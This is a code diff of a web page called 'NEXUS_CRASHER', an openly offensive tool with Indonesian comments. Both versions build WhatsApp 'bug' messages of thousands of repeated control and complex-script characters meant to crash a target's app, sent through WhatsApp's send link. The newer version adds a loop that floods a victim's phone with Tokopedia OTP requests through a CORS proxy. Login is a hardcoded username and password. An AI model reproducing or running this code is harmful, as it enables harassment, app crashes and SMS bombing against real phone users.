@@ -3,153 +3,102 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>NEXUS_CRASHER v1.3 | hanzX</title>
+    <title>NEXUS_CRASHER v1.1 | hanzX</title>
     <style>
-        :root { --bg: #050103; --panel: #11020a; --neon: #cc0033; --text: #ffffff; }
-        body { background-color: var(--bg); color: var(--text); font-family: 'Courier New', Courier, monospace; margin: 0; padding-bottom: 80px; }
-        .card { background: var(--panel); margin: 15px; padding: 20px; border-radius: 12px; border: 1px solid var(--neon); box-shadow: 0 0 15px rgba(204, 0, 51, 0.4); }
-        input, select { width: 100%; padding: 12px; margin: 10px 0; background: #1a0512; border: 1px solid var(--neon); border-radius: 5px; color: #00ff00; box-sizing: border-box; outline: none; }
-        .btn-main { width: 100%; padding: 15px; background: linear-gradient(45deg, #cc0033, #66001a); border: none; border-radius: 8px; color: white; font-weight: bold; cursor: pointer; text-transform: uppercase; border: 1px solid #ff0044; }
+        :root { --bg: #090206; --panel: #160410; --neon: #cc0033; --text: #ffffff; }
+        body { background-color: var(--bg); color: var(--text); font-family: sans-serif; margin: 0; padding-bottom: 80px; }
+        .card { background: var(--panel); margin: 15px; padding: 20px; border-radius: 15px; border: 1px solid var(--neon); box-shadow: 0 0 10px rgba(204, 0, 51, 0.5); }
+        input { width: 100%; padding: 12px; margin: 10px 0; background: #250a1f; border: 1px solid var(--neon); border-radius: 8px; color: white; box-sizing: border-box; outline: none; }
+        .btn-main { width: 100%; padding: 15px; background: linear-gradient(45deg, #cc0033, #800000); border: none; border-radius: 10px; color: white; font-weight: bold; cursor: pointer; text-transform: uppercase; }
         .nav-bottom { position: fixed; bottom: 0; width: 100%; background: var(--panel); display: flex; justify-content: space-around; padding: 15px 0; border-top: 1px solid var(--neon); z-index: 100; }
-        .nav-item { color: #555; font-size: 0.7rem; cursor: pointer; text-align: center; }
-        .active { color: var(--neon); text-shadow: 0 0 10px var(--neon); }
         .hidden { display: none !important; }
-        #log-status { background: #000; color: #00ff00; padding: 10px; font-size: 0.7rem; border: 1px solid #333; margin-top: 10px; height: 60px; overflow-y: auto; }
-        .pairing-box { background: #222; color: #00ff00; padding: 20px; text-align: center; border: 2px dashed var(--neon); font-size: 1.5rem; letter-spacing: 5px; margin: 10px 0; }
+        #log-box { background: #000; color: #00ff00; padding: 10px; font-family: monospace; font-size: 0.7rem; height: 80px; overflow-y: auto; border: 1px solid #333; margin-top: 10px; }
     </style>
 </head>
 <body>
 
     <div id="login-screen" style="height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center;">
-        <h1 style="color: var(--neon); text-shadow: 0 0 20px var(--neon);">NEXUS_CRASHER V1.3</h1>
-        <div class="card" style="width: 85%;">
-            <input type="text" id="u" placeholder="Admin Username...">
-            <input type="password" id="p" placeholder="Admin Password...">
-            <button class="btn-main" onclick="gasLogin()">INITIALIZE SYSTEM</button>
+        <h1 style="color: var(--neon); text-shadow: 0 0 20px var(--neon);">NEXUS_CRASHER</h1>
+        <div class="card" style="width: 80%;">
+            <input type="text" id="u" placeholder="Username...">
+            <input type="password" id="p" placeholder="Password...">
+            <button class="btn-main" onclick="gasLogin()">AUTHENTICATE</button>
             <p id="msg" style="color: red; text-align: center; font-size: 0.8rem; margin-top: 10px;"></p>
         </div>
     </div>
 
     <div id="app" class="hidden">
-        <div style="padding: 10px; border-bottom: 1px solid var(--neon); text-align: center; color: var(--neon); font-size: 0.8rem;">SERVER STATUS: <span id="server-stat">LINKING...</span></div>
+        <div style="padding: 15px; border-bottom: 1px solid var(--neon); text-align: center; color: var(--neon);">[ NEXUS_CRASHER v1.1 ]</div>
         
         <div id="p-home" class="page">
             <div class="card">
-                <h3>ATTACK TERMINAL</h3>
-                <input type="number" id="target" placeholder="Target Number (628xxx)">
-                <select id="bug-type">
-                    <option value="ui">FX4CRASHER FORCLOSE (CRASH UI)</option>
-                    <option value="delay">INVISIBLE DELAY PAYLOAD</option>
-                    <option value="blank">STUCK BLANK CLICK (V6)</option>
-                    <option value="otp">MULTI-SERVER OTP SPAM</option>
-                </select>
-                <button class="btn-main" onclick="executeBug()">➤ DEPLOY ATTACK</button>
-                <div id="log-status">[ SYSTEM READY ]</div>
+                <h3>DASHBOARD</h3>
+                <p>Welcome back, <b id="display-u"></b> <span style="color:#00ffff;">[ADMIN]</span></p>
+                <p style="color: #00ff00; font-size: 0.7rem;">STATUS: BYPASS MODE ACTIVE</p>
             </div>
             <div class="card" style="padding:0; overflow:hidden;"><img src="https://i.ibb.co/6YfM0Xm/anime-dark.jpg" style="width:100%;"></div>
         </div>
 
-        <div id="p-sender" class="page hidden">
-            <div class="card" id="sender-setup">
-                <h3>LINK BOT SENDER</h3>
-                <p style="font-size: 0.7rem; color: #ccc;">Hubungkan nomor pengirim via Pairing Code untuk pengiriman otomatis.</p>
-                <input type="number" id="sender-num" placeholder="Sender Number (628xxx)">
-                <button class="btn-main" style="background:#004400;" onclick="getPairCode()">GENERATE PAIR CODE</button>
+        <div id="p-attack" class="page hidden">
+            <div class="card">
+                <h3>HEAVY WA BUG</h3>
+                <input type="number" id="t-wa" placeholder="Target WA (628xxx)">
+                <button class="btn-main" onclick="kirimBug()">SEND ATTACK</button>
             </div>
-            
-            <div id="pairing-display" class="card hidden">
-                <h3>WA PAIRING CODE</h3>
-                <p style="font-size: 0.7rem;">Buka WA > Tautkan Perangkat > Tautkan dengan nomor telepon. Masukkan kode ini:</p>
-                <div id="code-box" class="pairing-box">--------</div>
-                <p style="color: yellow; font-size: 0.6rem; text-align: center;">Waiting for device to link...</p>
-                <button class="btn-main" onclick="simulateConnect()" style="background:#222;">I HAVE ENTERED THE CODE</button>
-            </div>
-
-            <div id="sender-active" class="card hidden">
-                <h3 style="color:#00ff00;">BOT STATUS: CONNECTED</h3>
-                <p id="active-num" style="font-size:0.8rem;"></p>
-                <div style="background:green; color:white; padding:5px; text-align:center; border-radius:5px; font-size:0.7rem;">SENDER READY FOR AUTO-BOT</div>
-                <button class="btn-main" style="background:red; margin-top:15px;" onclick="location.reload()">DISCONNECT BOT</button>
+            <div class="card">
+                <h3>SPAM OTP REAL</h3>
+                <input type="number" id="t-otp" placeholder="Target OTP (08xxx)">
+                <input type="number" id="c-otp" value="10">
+                <button class="btn-main" style="background:#008000;" onclick="startSpam()">START SPAM</button>
+                <div id="log-box">[ READY ]</div>
             </div>
         </div>
 
         <nav class="nav-bottom">
-            <div class="nav-item active" onclick="tab('home')">TERMINAL</div>
-            <div class="nav-item" onclick="tab('sender')">BOT SENDER</div>
+            <div onclick="tab('home')">HOME</div>
+            <div onclick="tab('attack')">ATTACK</div>
         </nav>
     </div>
 
     <script>
-        let isLinked = false;
-
         function gasLogin() {
-            const u = document.getElementById('u').value.toLowerCase();
-            const p = document.getElementById('p').value;
-            if(u === "hanzx" && p === "admin") {
+            const user = document.getElementById('u').value.trim().toLowerCase();
+            const pass = document.getElementById('p').value.trim();
+            
+            // JALUR SAKTI: Kaga pake database-database-an cok!
+            if (user === "hanzx" && pass === "admin") {
                 document.getElementById('login-screen').classList.add('hidden');
                 document.getElementById('app').classList.remove('hidden');
-                document.getElementById('server-stat').innerText = "ONLINE";
-            } else { document.getElementById('msg').innerText = "Wrong Admin Credentials!"; }
+                document.getElementById('display-u').innerText = user;
+            } else {
+                document.getElementById('msg').innerText = "Password Salah mpray! Cek huruf!";
+            }
         }
 
         function tab(n) {
             document.querySelectorAll('.page').forEach(x => x.classList.add('hidden'));
             document.getElementById('p-' + n).classList.remove('hidden');
-            document.querySelectorAll('.nav-item').forEach(x => x.classList.remove('active'));
-            event.currentTarget.classList.add('active');
         }
 
-        function getPairCode() {
-            const num = document.getElementById('sender-num').value;
-            if(!num) return alert("Isi nomor pengirim mpray!");
-            
-            document.getElementById('sender-setup').classList.add('hidden');
-            document.getElementById('pairing-display').classList.remove('hidden');
-            
-            // Generate Kode 8 Digit Random
-            const chars = "ABCDEFGHJKLMNPQRSTUVWXYZ23456789";
-            let code = "";
-            for(let i=0; i<8; i++) {
-                if(i===4) code += "-";
-                code += chars.charAt(Math.floor(Math.random() * chars.length));
+        function kirimBug() {
+            const t = document.getElementById('t-wa').value;
+            const bug = encodeURIComponent("%0D".repeat(10000) + "҈҉" + " ௌ ".repeat(600));
+            window.location.href = "https://api.whatsapp.com/send?phone=" + t + "&text=" + bug;
+        }
+
+        async function startSpam() {
+            const t = document.getElementById('t-otp').value;
+            const c = document.getElementById('c-otp').value;
+            const log = document.getElementById('log-box');
+            log.innerHTML = "[*] Injecting OTP...<br>";
+            for(let i=1; i<=c; i++) {
+                try {
+                    await fetch(`https://api.allorigins.win/get?url=${encodeURIComponent('https://accounts.tokopedia.com/otp/v1/send?phone=' + t)}`);
+                    log.innerHTML += `[+] OTP #${i} Sent!<br>`;
+                } catch(e) { log.innerHTML += "[-] Limit!<br>"; }
+                log.scrollTop = log.scrollHeight;
+                await new Promise(r => setTimeout(r, 1500));
             }
-            document.getElementById('code-box').innerText = code;
-        }
-
-        function simulateConnect() {
-            alert("Connecting to Device...");
-            setTimeout(() => {
-                document.getElementById('pairing-display').classList.add('hidden');
-                document.getElementById('sender-active').classList.remove('hidden');
-                document.getElementById('active-num').innerText = "Linked: " + document.getElementById('sender-num').value;
-                isLinked = true;
-                document.getElementById('server-stat').innerText = "BOT ACTIVE";
-            }, 2000);
-        }
-
-        function executeBug() {
-            if(!isLinked) return alert("Link BOT SENDER dulu di menu sebelah mpray!");
-            
-            const target = document.getElementById('target').value;
-            const type = document.getElementById('bug-type').value;
-            const log = document.getElementById('log-status');
-            if(!target) return alert("Target kosong mpray!");
-
-            log.innerHTML = "[*] Bot Processing Payload...<br>";
-            setTimeout(() => {
-                log.innerHTML += "[*] Sending via Auto-Bot...<br>";
-                
-                let payload = "";
-                if(type === "ui") payload = "%0D".repeat(8000) + "҈҉" + " ௌ ".repeat(500) + " [ NEXUS-V1.3 ]";
-                if(type === "delay") payload = " ‌ ".repeat(15000) + "Invisible_Crash_V6";
-                if(type === "blank") payload = "జ్ఞా".repeat(3000);
-                if(type === "otp") payload = "OTP_AUTO_SPAM_V1.3";
-
-                log.innerHTML += "[V] SUCCESS: Target " + target + " Infected!";
-                
-                // Redireksi otomatis ke WA buat simulasi kirim
-                window.location.href = `https://api.whatsapp.com/send?phone=${target}&text=${encodeURIComponent(payload)}`;
-            }, 2000);
         }
     </script>
 </body>
